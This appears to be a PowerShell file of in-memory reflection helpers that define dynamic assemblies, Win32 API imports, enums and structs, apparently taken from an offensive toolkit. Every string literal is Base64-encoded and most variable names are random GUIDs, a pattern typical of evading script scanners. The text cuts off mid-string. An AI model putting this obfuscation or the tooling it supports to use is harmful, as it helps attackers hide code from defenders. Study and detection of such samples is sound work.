
function New-InMemoryModule {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        
[ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = 
[Guid]::NewGuid().ToString()
    )
    
${4dc47c9aea9e4420bfbde14c00e654f7} = 
[Reflection.Assembly].Assembly.GetType
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB5AHMAdABlAG0ALgBBAHAAcABEAG8AbQBhAGkAbgA=')))).GetProperty
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgA=')))).GetValue($null, @())
    
${160324abfcd643c3956028d44f610af7} = 
${4dc47c9aea9e4420bfbde14c00e654f7}.GetAssemblies()
    foreach 
(${59251ac278684e49a098924723881b6f} in 
${160324abfcd643c3956028d44f610af7}) {
        if 
(${59251ac278684e49a098924723881b6f}.FullName -and 
(${59251ac278684e49a098924723881b6f}.FullName.Split(',')[0] -eq 
$ModuleName)) {
            return 
${59251ac278684e49a098924723881b6f}
        }
    }
    
${ee330fde8ebd45e78cc1d2e2c6e46a92} = New-Object 
Reflection.AssemblyName($ModuleName)
    $Domain = 
${4dc47c9aea9e4420bfbde14c00e654f7}
    
${91f60e4bc15e41eea6395c2884bf03a2} = $Domain.DefineDynamicAssembly
(${ee330fde8ebd45e78cc1d2e2c6e46a92}, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgB1AG4A'))))
    ${e967a391dc114030abdcfe8781ac8688} = 
${91f60e4bc15e41eea6395c2884bf03a2}.DefineDynamicModule($ModuleName, 
$False)
    return ${e967a391dc114030abdcfe8781ac8688}
}
function func 
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
     
   [String]
        $DllName,
        [Parameter(Position = 1, 
Mandatory = $True)]
        [string]
        $FunctionName,
        
[Parameter(Position = 2, Mandatory = $True)]
        [Type]
        
$ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        
$ParameterTypes,
        [Parameter(Position = 4)]
        
[Runtime.InteropServices.CallingConvention]
        
$NativeCallingConvention,
        [Parameter(Position = 5)]
        
[Runtime.InteropServices.CharSet]
        $Charset,
        [String]
   
     $EntryPoint,
        [Switch]
        $SetLastError
    )
    
$Properties = @{
        DllName = $DllName
        FunctionName = 
$FunctionName
        ReturnType = $ReturnType
    }
    if 
($ParameterTypes) { $Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = $ParameterTypes }
  
  if ($NativeCallingConvention) { $Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')
))] = $NativeCallingConvention }
    if ($Charset) { $Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBoAGEAcgBzAGUAdAA=')))] = $Charset }
    if ($SetLastError) { 
$Properties[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] 
= $SetLastError }
    if ($EntryPoint) { $Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))] = $EntryPoint }
    New-Object 
PSObject -Property $Properties
}
function Add-Win32Type
{
    
[OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=
$True, ValueFromPipelineByPropertyName=$True)]
        [String]
       
 $DllName,
        [Parameter(Mandatory=$True, 
ValueFromPipelineByPropertyName=$True)]
        [String]
        
$FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=
$True)]
        [String]
        $EntryPoint,
        [Parameter
(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        
[Type]
        $ReturnType,
        [Parameter
(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        
$ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=
$True)]
        [Runtime.InteropServices.CallingConvention]
        
$NativeCallingConvention = 
[Runtime.InteropServices.CallingConvention]::StdCall,
        
[Parameter(ValueFromPipelineByPropertyName=$True)]
        
[Runtime.InteropServices.CharSet]
        $Charset = 
[Runtime.InteropServices.CharSet]::Auto,
        [Parameter
(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        
$SetLastError,
        [Parameter(Mandatory=$True)]
        
[ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -
is [Reflection.Assembly])})]
        $Module,
        
[ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    
BEGIN
    {
        ${18095a23e1714ef998a17fb09f500c2b} = @{}
    }
    
PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
  
          if ($Namespace)
            {
                
${18095a23e1714ef998a17fb09f500c2b}[$DllName] = $Module.GetType
($ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABOAGEAbQBlAHMAcABhAGMAZQAuACQARABsAGwATgBhAG0AZQA='))))
          
  }
            else
            {
                
${18095a23e1714ef998a17fb09f500c2b}[$DllName] = $Module.GetType
($DllName)
            }
        }
        else
        {
            if 
(!${18095a23e1714ef998a17fb09f500c2b}.ContainsKey($DllName))
         
   {
                if ($Namespace)
                {
                 
   ${18095a23e1714ef998a17fb09f500c2b}[$DllName] = 
$Module.DefineType($ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABOAGEAbQBlAHMAcABhAGMAZQAuACQARABsAGwATgBhAG0AZQA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
  
              }
                else
                {
                 
   ${18095a23e1714ef998a17fb09f500c2b}[$DllName] = 
$Module.DefineType($DllName, $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
  
              }
            }
            $Method = 
${18095a23e1714ef998a17fb09f500c2b}[$DllName].DefineMethod(
          
      $FunctionName,
                
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbA
A='))),
                $ReturnType,
                $ParameterTypes)
  
          ${9e5bb180fda8451b8ec7f5d4ed0667a4} = 1
            
foreach(${eb9d1592bf8543a6beac6ea449455a8a} in $ParameterTypes)
      
      {
                if 
(${eb9d1592bf8543a6beac6ea449455a8a}.IsByRef)
                {
       
             [void] $Method.DefineParameter
(${9e5bb180fda8451b8ec7f5d4ed0667a4}, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwB1AHQA'))), $null)
                }
                
${9e5bb180fda8451b8ec7f5d4ed0667a4}++
            }
            
${c7605163ee624273ac6efb6189eef8c7} = 
[Runtime.InteropServices.DllImportAttribute]
            
${7c8a1e2b2d4b4ac2b1901ca345a4a8a5} = 
${c7605163ee624273ac6efb6189eef8c7}.GetField
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            
${095e3676408d4cf89f0ec6ee032aec8f} = 
${c7605163ee624273ac6efb6189eef8c7}.GetField
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            
${250ccdbd78e14de59faf39206216d94d} = 
${c7605163ee624273ac6efb6189eef8c7}.GetField
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBoAGEAcgBTAGUAdAA='))))
            
${f9411704e202408996b5fdfe2db3b159} = 
${c7605163ee624273ac6efb6189eef8c7}.GetField
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQBuAHQAcgB5AFAAbwBpAG4AdAA='))))
            if ($SetLastError) { 
${d0c44df89797466bbab6c7c0d213a02d} = $True } else { 
${d0c44df89797466bbab6c7c0d213a02d} = $False }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))]) { 
${54eb490f7c6f47d5b0f0432e587848c2} = $EntryPoint } else { 
${54eb490f7c6f47d5b0f0432e587848c2} = $FunctionName }
            
${ee7ac42c1d33441abcf381e5672c5ad9} = 
[Runtime.InteropServices.DllImportAttribute].GetConstructor
([String])
            ${9e477a3e8a57438a9bd4ad0fd5bf78b1} = New-
Object Reflection.Emit.CustomAttributeBuilder
(${ee7ac42c1d33441abcf381e5672c5ad9},
                $DllName, 
[Reflection.PropertyInfo[]] @(), [Object[]] @(),
                
[Reflection.FieldInfo[]] @(${7c8a1e2b2d4b4ac2b1901ca345a4a8a5},
      
                                     
${095e3676408d4cf89f0ec6ee032aec8f},
                                 
          ${250ccdbd78e14de59faf39206216d94d},
                       
                    ${f9411704e202408996b5fdfe2db3b159}),
            
    [Object[]] @(${d0c44df89797466bbab6c7c0d213a02d},
                
             ([Runtime.InteropServices.CallingConvention] 
$NativeCallingConvention),
                             
([Runtime.InteropServices.CharSet] $Charset),
                        
     ${54eb490f7c6f47d5b0f0432e587848c2}))
            
$Method.SetCustomAttribute(${9e477a3e8a57438a9bd4ad0fd5bf78b1})
      
  }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
   
     {
            return ${18095a23e1714ef998a17fb09f500c2b}
        
}
        ${dc558ccf7add4e4683cb234deb8d6868} = @{}
        foreach 
(${647da57433db4e15bf0f72731d2eab78} in 
${18095a23e1714ef998a17fb09f500c2b}.Keys)
        {
            $Type 
= ${18095a23e1714ef998a17fb09f500c2b}
[${647da57433db4e15bf0f72731d2eab78}].CreateType()
            
${dc558ccf7add4e4683cb234deb8d6868}
[${647da57433db4e15bf0f72731d2eab78}] = $Type
        }
        return 
${dc558ccf7add4e4683cb234deb8d6868}
    }
}
function psenum {
    
[OutputType([Type])]
    Param (
        [Parameter(Position = 0, 
Mandatory=$True)]
        [ValidateScript({($_ -is 
[Reflection.Emit.ModuleBuilder]) -or ($_ -is 
[Reflection.Assembly])})]
        $Module,
        [Parameter(Position 
= 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        
[String]
        $FullName,
        [Parameter(Position = 2, 
Mandatory=$True)]
        [Type]
        $Type,
        [Parameter
(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
   
     [Hashtable]
        $EnumElements,
        [Switch]
        
$Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        
return ($Module.GetType($FullName))
    }
    
${38d390d8a44944b2b6b2262b3e998022} = $Type -as [Type]
    
${028abc505406405489734ce5349929d8} = $Module.DefineEnum($FullName, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAB1AGIAbABpAGMA'))), ${38d390d8a44944b2b6b2262b3e998022})
    if 
($Bitfield)
    {
        ${4fb6a2c2dc154da9866326faecf238c5} = 
[FlagsAttribute].GetConstructor(@())
        
${91b80d4705ec464ab4e22118b4590e9c} = New-Object 
Reflection.Emit.CustomAttributeBuilder
(${4fb6a2c2dc154da9866326faecf238c5}, @())
        
${028abc505406405489734ce5349929d8}.SetCustomAttribute
(${91b80d4705ec464ab4e22118b4590e9c})
    }
    foreach 
(${647da57433db4e15bf0f72731d2eab78} in $EnumElements.Keys)
    {
     
   $null = ${028abc505406405489734ce5349929d8}.DefineLiteral
(${647da57433db4e15bf0f72731d2eab78}, $EnumElements
[${647da57433db4e15bf0f72731d2eab78}] -as 
${38d390d8a44944b2b6b2262b3e998022})
    }
    
${028abc505406405489734ce5349929d8}.CreateType()
}
function field {
    
Param (
        [Parameter(Position = 0, Mandatory=$True)]
        
[UInt16]
        $Position,
        [Parameter(Position = 1, 
Mandatory=$True)]
        [Type]
        $Type,
        [Parameter
(Position = 2)]
        [UInt16]
        $Offset,
        [Object[]]
    
    $MarshalAs
    )
    @{
        Position = $Position
        Type = 
$Type -as [Type]
        Offset = $Offset
        MarshalAs = 
$MarshalAs
    }
}
function struct
{
    [OutputType([Type])]
    Param (
  
      [Parameter(Position = 1, Mandatory=$True)]
        
[ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -
is [Reflection.Assembly])})]
        $Module,
        [Parameter
(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
   
     [String]
        $FullName,
        [Parameter(Position = 3, 
Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        
[Hashtable]
        $StructFields,
        
[Reflection.Emit.PackingSize]
        $PackingSize = 
[Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        
$ExplicitLayout
    )
    if ($Module -is [Reflection.Assembly])
    {
  
      return ($Module.GetType($FullName))
    }
    
[Reflection.TypeAttributes] ${0662434a906a4f1eb313d4e18b891875} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBuAHMAaQBDAGwAYQBzAHMALAAKACAAIAAgACAAIAAgACAAIABDAGwAYQBzAHMALA
AKACAAIAAgACAAIAAgACAAIABQAHUAYgBsAGkAYwAsAAoAIAAgACAAIAAgACAAIAAgAF
MAZQBhAGwAZQBkACwACgAgACAAIAAgACAAIAAgACAAQgBlAGYAbwByAGUARgBpAGUAbA
BkAEkAbgBpAHQA')))
    if ($ExplicitLayout)
    {
        
${0662434a906a4f1eb313d4e18b891875} = 
${0662434a906a4f1eb313d4e18b891875} -bor 
[Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        
${0662434a906a4f1eb313d4e18b891875} = 
${0662434a906a4f1eb313d4e18b891875} -bor 
[Reflection.TypeAttributes]::SequentialLayout
    }
    
${9553a8d6c2a946259ab39aa6c249b86c} = $Module.DefineType($FullName, 
${0662434a906a4f1eb313d4e18b891875}, [ValueType], $PackingSize)
    
${0644c0db14364be189dbcc5adde3ddba} = 
[Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    
${adf66791fa3f41709d5a9125b885c654} = @
([Runtime.InteropServices.MarshalAsAttribute].GetField
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    
${190669ecf7bf4a4daf09ec335fd568e5} = New-Object Hashtable[]
($StructFields.Count)
    foreach 
(${b4887a1b9a674e13a468502a844c4cb0} in $StructFields.Keys)
    {
     
   ${c68528a70f324585a5d8f3a63646d980} = $StructFields
[${b4887a1b9a674e13a468502a844c4cb0}]
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHMAaQB0AGkAbwBuAA==')))]
        
${190669ecf7bf4a4daf09ec335fd568e5}
[${c68528a70f324585a5d8f3a63646d980}] = @{FieldName = 
${b4887a1b9a674e13a468502a844c4cb0}; Properties = $StructFields
[${b4887a1b9a674e13a468502a844c4cb0}]}
    }
    foreach 
(${b4887a1b9a674e13a468502a844c4cb0} in 
${190669ecf7bf4a4daf09ec335fd568e5})
    {
        
${70c7cf960db648328431e6b2c0f3c209} = 
${b4887a1b9a674e13a468502a844c4cb0}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBpAGUAbABkAE4AYQBtAGUA')))]
        
${947272be4826477c9aae5d1e04bae0ef} = 
${b4887a1b9a674e13a468502a844c4cb0}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        $Offset = 
${947272be4826477c9aae5d1e04bae0ef}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBmAGYAcwBlAHQA')))]
        $Type = 
${947272be4826477c9aae5d1e04bae0ef}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VAB5AHAAZQA=')))]
        $MarshalAs = 
${947272be4826477c9aae5d1e04bae0ef}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHIAcwBoAGEAbABBAHMA')))]
        
${f3e9230cf103432887977cb38d76bde5} = 
${9553a8d6c2a946259ab39aa6c249b86c}.DefineField
(${70c7cf960db648328431e6b2c0f3c209}, $Type, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAB1AGIAbABpAGMA'))))
        if ($MarshalAs)
        {
            
${b5d65f82d5464071886153ae500cc45c} = $MarshalAs[0] -as 
([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs
[1])
            {
                ${c57756e12b274589b792ea5872a5a785} 
= $MarshalAs[1]
                ${adf3dfc8945e4d33b1bb1eb4a66ad976} = 
New-Object Reflection.Emit.CustomAttributeBuilder
(${0644c0db14364be189dbcc5adde3ddba},
                    
${b5d65f82d5464071886153ae500cc45c}, 
${adf66791fa3f41709d5a9125b885c654}, @
(${c57756e12b274589b792ea5872a5a785}))
            }
            else
  
          {
                ${adf3dfc8945e4d33b1bb1eb4a66ad976} = 
New-Object Reflection.Emit.CustomAttributeBuilder
(${0644c0db14364be189dbcc5adde3ddba}, [Object[]] @
(${b5d65f82d5464071886153ae500cc45c}))
            }
            
${f3e9230cf103432887977cb38d76bde5}.SetCustomAttribute
(${adf3dfc8945e4d33b1bb1eb4a66ad976})
        }
        if 
($ExplicitLayout) { ${f3e9230cf103432887977cb38d76bde5}.SetOffset
($Offset) }
    }
    ${f12c33b960d040ac83cee404fadc36a0} = 
${9553a8d6c2a946259ab39aa6c249b86c}.DefineMethod
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAHQAUwBpAHoAZQA='))),
        
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        
[Type[]] @())
    ${b9648628832045159a311b8140232f32} = 
${f12c33b960d040ac83cee404fadc36a0}.GetILGenerator()
    
${b9648628832045159a311b8140232f32}.Emit
([Reflection.Emit.OpCodes]::Ldtoken, 
${9553a8d6c2a946259ab39aa6c249b86c})
    
${b9648628832045159a311b8140232f32}.Emit
([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    
${b9648628832045159a311b8140232f32}.Emit
([Reflection.Emit.OpCodes]::Call,
        
[Runtime.InteropServices.Marshal].GetMethod
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    
${b9648628832045159a311b8140232f32}.Emit
([Reflection.Emit.OpCodes]::Ret)
    
${c7b32bb9ef144f748647ac3d74bbbaa5} = 
${9553a8d6c2a946259ab39aa6c249b86c}.DefineMethod
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQ
B0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG
0AZQA='))),
        ${9553a8d6c2a946259ab39aa6c249b86c},
        
[Type[]] @([IntPtr]))
    ${5efac066591e49c894140701f394884b} = 
${c7b32bb9ef144f748647ac3d74bbbaa5}.GetILGenerator()
    
${5efac066591e49c894140701f394884b}.Emit
([Reflection.Emit.OpCodes]::Nop)
    
${5efac066591e49c894140701f394884b}.Emit
([Reflection.Emit.OpCodes]::Ldarg_0)
    
${5efac066591e49c894140701f394884b}.Emit
([Reflection.Emit.OpCodes]::Ldtoken, 
${9553a8d6c2a946259ab39aa6c249b86c})
    
${5efac066591e49c894140701f394884b}.Emit
([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    
${5efac066591e49c894140701f394884b}.Emit
([Reflection.Emit.OpCodes]::Call,
        
[Runtime.InteropServices.Marshal].GetMethod
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], 
[Type])))
    ${5efac066591e49c894140701f394884b}.Emit
([Reflection.Emit.OpCodes]::Unbox_Any, 
${9553a8d6c2a946259ab39aa6c249b86c})
    
${5efac066591e49c894140701f394884b}.Emit
([Reflection.Emit.OpCodes]::Ret)
    
${9553a8d6c2a946259ab39aa6c249b86c}.CreateType()
}
Function New-
DynamicParameter {
    [CmdletBinding(DefaultParameterSetName = 
'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, 
ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, 
ParameterSetName = 'DynamicParameter')]
        
[ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [System.Type]$Type = [int],
        
[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName 
= 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [switch]$Mandatory,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [int]$Position,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [string]$HelpMessage,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [switch]$DontShow,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [switch]$ValueFromPipeline,
        
[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName 
= 'DynamicParameter')]
        
[switch]$ValueFromPipelineByPropertyName,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,
    
    [Parameter(ValueFromPipelineByPropertyName = $true, 
ParameterSetName = 'DynamicParameter')]
        
[string]$ParameterSetName = '__AllParameterSets',
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [switch]$AllowNull,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [switch]$AllowEmptyString,
        
[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName 
= 'DynamicParameter')]
        [switch]$AllowEmptyCollection,
        
[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName 
= 'DynamicParameter')]
        [switch]$ValidateNotNull,
        
[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName 
= 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,
       
 [Parameter(ValueFromPipelineByPropertyName = $true, 
ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
  
      [int[]]$ValidateCount,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [ValidateCount(2,2)]
        [int
[]]$ValidateRange,
        [Parameter(ValueFromPipelineByPropertyName 
= $true, ParameterSetName = 'DynamicParameter')]
        
[ValidateCount(2,2)]
        [int[]]$ValidateLength,
        
[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName 
= 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        
[string]$ValidatePattern,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        
[scriptblock]$ValidateScript,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        
[string[]]$ValidateSet,
        [Parameter
(ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        
[ValidateScript({
            if(!($_ -is 
[System.Management.Automation.RuntimeDefinedParameterDictionary]))
   
         {
                Throw 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABpAGMAdABpAG8AbgBhAHIAeQAgAG0AdQBzAHQAIABiAGUAIABhACAAUwB5AHMAdA
BlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAF
IAdQBuAHQAaQBtAGUARABlAGYAaQBuAGUAZABQAGEAcgBhAG0AZQB0AGUAcgBEAGkAYw
B0AGkAbwBuAGEAcgB5ACAAbwBiAGoAZQBjAHQA')))
            }
            
$true
        })]
        $Dictionary = $false,
        [Parameter
(Mandatory = $true, ValueFromPipelineByPropertyName = $true, 
ParameterSetName = 'CreateVariables')]
        
[switch]$CreateVariables,
        [Parameter(Mandatory = $true, 
ValueFromPipelineByPropertyName = $true, ParameterSetName = 
'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        
[ValidateScript({
            if($_.GetType().Name -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) {
                Throw 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAIABtAHUAcwB0ACAAYgBlACAAYQ
AgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAH
QAaQBvAG4ALgBQAFMAQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMARABpAGMAdA
BpAG8AbgBhAHIAeQAgAG8AYgBqAGUAYwB0AA==')))
            }
            
$true
        })]
        $BoundParameters
    )
    Begin {
        
${b129c2c78a264e40a93dfdce90ed619f} = New-Object -TypeName 
System.Management.Automation.RuntimeDefinedParameterDictionary
       
 function _temp { [CmdletBinding()] Param() }
        
${804cee6aeaed45f9b45664f64afdd19f} = (Get-Command 
_temp).Parameters.Keys
    }
    Process {
        if($CreateVariables) 
{
            ${d7f3587d8255444d8e2c04900943edad} = 
$BoundParameters.Keys | Where-Object { 
${804cee6aeaed45f9b45664f64afdd19f} -notcontains $_ }
            
ForEach(${eb9d1592bf8543a6beac6ea449455a8a} in 
${d7f3587d8255444d8e2c04900943edad}) {
                if 
(${eb9d1592bf8543a6beac6ea449455a8a}) {
                    Set-
Variable -Name ${eb9d1592bf8543a6beac6ea449455a8a} -Value 
$BoundParameters.${eb9d1592bf8543a6beac6ea449455a8a} -Scope 1 -
Force
                }
            }
        }
        else {
           
 ${957115cb84ed40feb1e00dd95606f3b2} = @()
            
${957115cb84ed40feb1e00dd95606f3b2} = 
$PSBoundParameters.GetEnumerator() |
                        
ForEach-Object {
                            if
($_.Value.PSobject.Methods.Name -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBFAHEAdQBhAGwAcwAkAA==')))) {
                                if
(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) 
{
                                    $_.Key
                          
      }
                            }
                            else 
{
                                if($_.Value -ne (Get-Variable -Name 
$_.Key -ValueOnly -Scope 0)) {
                                    
$_.Key
                                }
                            
}
                        }
            if
(${957115cb84ed40feb1e00dd95606f3b2}) {
                
${957115cb84ed40feb1e00dd95606f3b2} | ForEach-Object 
{[void]$PSBoundParameters.Remove($_)}
            }
            
${b7280f6a02524b8991bd646695c87140} = (Get-Command -Name 
($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  
|
                                        Where-Object { 
$_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } 
|
                                            Select-Object -
ExpandProperty Key |
                                                
Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            
${b6f008b604b34106b0c32024cd496049} = $null
            ForEach 
(${eb9d1592bf8543a6beac6ea449455a8a} in 
${b7280f6a02524b8991bd646695c87140}) {
                
${97ee04fe3d0246059f94b2094c8e9d7f} = Get-Variable -Name 
${eb9d1592bf8543a6beac6ea449455a8a} -ValueOnly -Scope 0
              
  if(!$PSBoundParameters.TryGetValue
(${eb9d1592bf8543a6beac6ea449455a8a}, 
[ref]${b6f008b604b34106b0c32024cd496049}) -and 
${97ee04fe3d0246059f94b2094c8e9d7f}) {
                    
$PSBoundParameters.${eb9d1592bf8543a6beac6ea449455a8a} = 
${97ee04fe3d0246059f94b2094c8e9d7f}
                }
            }
    
        if($Dictionary) {
                
${68e24da754d34c91816e71b0c5809c65} = $Dictionary
            }
       
     else {
                ${68e24da754d34c91816e71b0c5809c65} = 
${b129c2c78a264e40a93dfdce90ed619f}
            }
            
${ce9d88df51894091b1dc14b7dad06e3d} = {Get-Variable -Name $_ -
ValueOnly -Scope 0}
            ${0e4e5b91e6c048e68306d3e606465eb9} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgAoAE0AYQBuAGQAYQB0AG8AcgB5AHwAUABvAHMAaQB0AGkAbwBuAHwAUABhAHIAYQ
BtAGUAdABlAHIAUwBlAHQATgBhAG0AZQB8AEQAbwBuAHQAUwBoAG8AdwB8AEgAZQBsAH
AATQBlAHMAcwBhAGcAZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQ
B8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAH
